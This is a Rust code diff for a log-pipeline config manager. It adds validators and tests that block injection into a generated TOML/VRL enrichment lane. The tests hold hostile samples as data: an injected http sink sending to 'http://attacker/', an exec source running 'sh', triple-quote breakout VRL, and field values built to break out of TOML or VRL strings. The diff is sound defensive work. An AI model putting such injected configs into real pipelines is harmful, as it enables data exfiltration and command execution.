@@ -192,6 +192,76 @@ pub(super) fn enrichment_lane_backpressure_violations(candidate_enrichment_toml:
     violations
 }
 
+/// NAN-1197: a ClickHouse table identifier, optionally `db.table`-qualified.
+/// `target_table` is interpolated raw into the generated sink's `table = "{…}"`
+/// value, so anything outside this set could break out of the TOML string.
+fn is_valid_ch_table_ident(s: &str) -> bool {
+    fn is_ident(part: &str) -> bool {
+        let mut chars = part.chars();
+        match chars.next() {
+            Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
+            _ => return false,
+        }
+        chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
+    }
+    match s.split_once('.') {
+        Some((db, table)) => is_ident(db) && is_ident(table),
+        None => is_ident(s),
+    }
+}
+
+/// NAN-1197: a safe enrichment-source discriminator. `enrich_source` is
+/// interpolated into the router VRL comparison literal, so restrict it to a
+/// token charset that cannot terminate the string or inject VRL.
+fn is_safe_enrich_source(s: &str) -> bool {
+    !s.is_empty()
+        && s.len() <= 64
+        && s.chars()
+            .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-' || c == '.')
+}
+
+/// NAN-1197: assert the generated enrichment lane contains only the components
+/// `generate_enrichment_lane` is supposed to emit. This is the defense-in-depth
+/// backstop to the per-parser source-text checks: even if a future escaping bug
+/// let a value slip through, an injected `[sinks.*]` of a non-ClickHouse type
+/// (http/socket/file exfil) or a non-remap transform (exec/lua) is rejected
+/// here before the config is written. Only the GENERATED path calls this — the
+/// committed static fallback is trusted.
+fn assert_enrichment_lane_topology(toml_str: &str) -> Result<(), String> {
+    let doc: toml::Table =
+        toml::from_str(toml_str).map_err(|e| format!("candidate TOML parse failed: {e}"))?;
+
+    // The lane must not introduce sources.
+    if doc.contains_key("sources") {
+        return Err("enrichment lane must not declare [sources]".to_string());
+    }
+
+    if let Some(transforms) = doc.get("transforms").and_then(|v| v.as_table()) {
+        for (name, def) in transforms {
+            if !name.starts_with("enrichment_normalize_") {
+                return Err(format!("unexpected transform '{name}'"));
+            }
+            let ty = def.get("type").and_then(|v| v.as_str()).unwrap_or_default();
+            if ty != "remap" {
+                return Err(format!("transform '{name}' has unexpected type '{ty}'"));
+            }
+        }
+    }
+
+    if let Some(sinks) = doc.get("sinks").and_then(|v| v.as_table()) {
+        for (name, def) in sinks {
+            let ty = def.get("type").and_then(|v| v.as_str()).unwrap_or_default();
+            let ok = (name.starts_with("clickhouse_") && ty == "clickhouse")
+                || (name == "enrichment_dead_letter" && ty == "blackhole");
+            if !ok {
+                return Err(format!("unexpected sink '{name}' (type '{ty}')"));
+            }
+        }
+    }
+
+    Ok(())
+}
+
 impl VectorConfigManager {
     /// Remove a parser's config file from the parsers directory
     ///
@@ -807,17 +877,59 @@ retry_max_duration_secs = 300
     }
 
     /// NAN-1150 deploy-time guardrails for the generated enrichment lane:
-    /// (1) each enabled parser's `normalize_vrl` must compile + satisfy the
-    /// `user_registry` encoding contract (NAN-1123), and (2) the candidate lane
-    /// TOML must not introduce a sink that backpressures the shared ingest
-    /// upstream (NAN-1114/1128). Returns `ValidationFailed` with a clear,
-    /// parser-named reason on the first violation.
+    /// (1) each enabled parser's `normalize_vrl` must pass the source-text
+    /// security checks (`'''` / TOML-header / blocked-function breakout) AND
+    /// compile + satisfy the `user_registry` encoding contract (NAN-1123),
+    /// (2) `target_table` / `enrich_source` are interpolated into the generated
+    /// TOML/VRL, so they must be safe identifiers (NAN-1197), (3) the generated
+    /// lane's component topology must be exactly what the generator intended —
+    /// no injected transform/sink (NAN-1197), and (4) the candidate lane TOML
+    /// must not introduce a sink that backpressures the shared ingest upstream
+    /// (NAN-1114/1128). Returns `ValidationFailed` with a clear, parser-named
+    /// reason on the first violation.
     pub(super) fn guard_enrichment_lane(
         enrichment_parsers: &[Parser],
         candidate_toml: &str,
     ) -> Result<(), VectorConfigError> {
+        let validator = crate::parsers::validator::VrlValidator::new();
         for p in enrichment_parsers.iter().filter(|p| p.enabled) {
             let vrl = p.normalize_vrl.as_deref().unwrap_or("");
+
+            // NAN-1197: `normalize_vrl` is embedded verbatim into the lane's
+            // `source = '''…'''` TOML literal. Reject a `'''` / TOML-header /
+            // blocked-function breakout BEFORE it can append a sink/transform —
+            // the encoding contract below only compiles + checks output shape.
+            validator.check_normalize_vrl_safety(vrl).map_err(|e| {
+                VectorConfigError::ValidationFailed(format!(
+                    "enrichment parser '{}' rejected at deploy: unsafe normalize VRL: {e}",
+                    p.name
+                ))
+            })?;
+
+            // NAN-1197: `target_table` is interpolated raw into `table = "{…}"`
+            // and the sink component id — require a ClickHouse identifier
+            // (optionally db-qualified) so it can't break the TOML string.
+            if let Some(table) = p.target_table.as_deref() {
+                if !is_valid_ch_table_ident(table) {
+                    return Err(VectorConfigError::ValidationFailed(format!(
+                        "enrichment parser '{}' rejected at deploy: invalid target_table {table:?} \
+                         (expected a ClickHouse identifier, optionally db-qualified)",
+                        p.name
+                    )));
+                }
+            }
+
+            // NAN-1197: `enrich_source` is interpolated into the router VRL
+            // comparison literal; require a safe discriminator token.
+            if let Some(src) = p.enrich_source.as_deref() {
+                if !src.is_empty() && !is_safe_enrich_source(src) {
+                    return Err(VectorConfigError::ValidationFailed(format!(
+                        "enrichment parser '{}' rejected at deploy: unsafe enrich_source {src:?}",
+                        p.name
+                    )));
+                }
+            }
+
             let kind = p.enrich_kind.as_deref().unwrap_or("identity");
             crate::parsers::validator::validate_enrichment_encoding_contract(kind, vrl).map_err(
                 |e| {
@@ -828,6 +940,20 @@ retry_max_duration_secs = 300
                 },
             )?;
         }
+
+        // NAN-1197: defense-in-depth — on the GENERATED path, assert the lane's
+        // component topology matches exactly what `generate_enrichment_lane`
+        // emits (only `enrichment_normalize_*` remaps and ClickHouse/blackhole
+        // sinks). Skipped for the trusted committed static fallback (no enabled
+        // parsers), whose shape is fixed at build time.
+        if enrichment_parsers.iter().any(|p| p.enabled) {
+            assert_enrichment_lane_topology(candidate_toml).map_err(|e| {
+                VectorConfigError::ValidationFailed(format!(
+                    "enrichment lane failed topology check (NAN-1197): {e}"
+                ))
+            })?;
+        }
+
         let backpressure = enrichment_lane_backpressure_violations(candidate_toml);
         if !backpressure.is_empty() {
             return Err(VectorConfigError::ValidationFailed(format!(
@@ -1538,6 +1664,109 @@ enabled = true
         assert!(
             violations.iter().any(|v| v.contains("clickhouse_user_registry")),
             "a blocking + acking user_registry sink reaching the shared ingest must be flagged, got {violations:?}"
+        );
+    }
+
+    // ---- NAN-1197: enrichment-lane injection guards --------------------------
+
+    #[test]
+    fn ch_table_ident_accepts_valid_rejects_breakouts() {
+        for ok in ["user_registry", "ip_enrichments", "nanosiem.user_registry", "_t"] {
+            assert!(is_valid_ch_table_ident(ok), "{ok} should be valid");
+        }
+        for bad in [
+            "",
+            "user_registry\"",
+            "user registry",
+            "user_registry\"\n[sinks.x]",
+            "1table",
+            "db.table.extra",
+            "tbl;DROP",
+        ] {
+            assert!(!is_valid_ch_table_ident(bad), "{bad:?} should be rejected");
+        }
+    }
+
+    #[test]
+    fn enrich_source_rejects_quote_and_whitespace() {
+        for ok in ["ad", "entra", "okta-prod", "ip.context"] {
+            assert!(is_safe_enrich_source(ok), "{ok} should be valid");
+        }
+        for bad in ["", "ad\" or true", "a b", "src\nx", &"x".repeat(65)] {
+            assert!(!is_safe_enrich_source(bad), "{bad:?} should be rejected");
+        }
+    }
+
+    #[test]
+    fn topology_accepts_real_generated_lane() {
+        let p = enrichment_test_parser(
+            "identity",
+            "user_registry",
+            ". = { \"external_id\": to_string(.id) ?? \"\" }",
+        );
+        let lane = VectorConfigManager::generate_enrichment_lane(&[&p]);
+        assert!(
+            assert_enrichment_lane_topology(&lane).is_ok(),
+            "a normally-generated lane must pass topology: {lane}"
+        );
+    }
+
+    #[test]
+    fn topology_rejects_injected_http_sink_and_lua_transform() {
+        let exfil = "[sinks.enrichment_dead_letter]\ntype = \"blackhole\"\ninputs = []\n\n\
+                     [sinks.exfil]\ntype = \"http\"\ninputs = [\"x\"]\nuri = \"http://attacker/\"\n";
+        assert!(assert_enrichment_lane_topology(exfil).is_err(), "http exfil sink must be rejected");
+
+        let lua = "[transforms.enrichment_normalize_ad]\ntype = \"lua\"\ninputs = []\nsource = \"x\"\n";
+        assert!(assert_enrichment_lane_topology(lua).is_err(), "non-remap transform must be rejected");
+
+        let src = "[sources.evil]\ntype = \"exec\"\ncommand = [\"sh\"]\n";
+        assert!(assert_enrichment_lane_topology(src).is_err(), "injected source must be rejected");
+    }
+
+    #[test]
+    fn guard_rejects_triple_quote_breakout_in_normalize_vrl() {
+        // Compiles as VRL (the ''' lives inside a "..." string) but would close
+        // the lane's TOML `source = '''…'''` literal.
+        let evil = "x = \"harmless ''' \n[sinks.exfil]\"\n. = { \"external_id\": \"1\" }";
+        let p = enrichment_test_parser("identity", "user_registry", evil);
+        let toml = VectorConfigManager::enrichment_lane_config(std::slice::from_ref(&p));
+        let err = VectorConfigManager::guard_enrichment_lane(std::slice::from_ref(&p), &toml)
+            .expect_err("a ''' breakout must be rejected at deploy");
+        assert!(
+            matches!(err, VectorConfigError::ValidationFailed(ref m) if m.contains("unsafe normalize VRL")),
+            "expected unsafe-normalize-VRL rejection, got {err:?}"
+        );
+    }
+
+    #[test]
+    fn guard_rejects_unsafe_target_table_and_enrich_source() {
+        let mut bad_table = enrichment_test_parser(
+            "identity",
+            "user_registry\"\n[sinks.x]",
+            ". = { \"external_id\": \"1\" }",
+        );
+        bad_table.enrich_source = Some("ad".to_string());
+        let toml = VectorConfigManager::enrichment_lane_config(std::slice::from_ref(&bad_table));
+        let err = VectorConfigManager::guard_enrichment_lane(std::slice::from_ref(&bad_table), &toml)
+            .expect_err("a TOML-breaking target_table must be rejected");
+        assert!(
+            matches!(err, VectorConfigError::ValidationFailed(ref m) if m.contains("invalid target_table")),
+            "expected invalid-target_table rejection, got {err:?}"
+        );
+
+        let mut bad_src = enrichment_test_parser(
+            "identity",
+            "user_registry",
+            ". = { \"external_id\": \"1\" }",
+        );
+        bad_src.enrich_source = Some("ad\" == .x || \"".to_string());
+        let toml2 = VectorConfigManager::enrichment_lane_config(std::slice::from_ref(&bad_src));
+        let err2 = VectorConfigManager::guard_enrichment_lane(std::slice::from_ref(&bad_src), &toml2)
+            .expect_err("a VRL-breaking enrich_source must be rejected");
+        assert!(
+            matches!(err2, VectorConfigError::ValidationFailed(ref m) if m.contains("unsafe enrich_source")),
+            "expected unsafe-enrich_source rejection, got {err2:?}"
         );
     }
 }
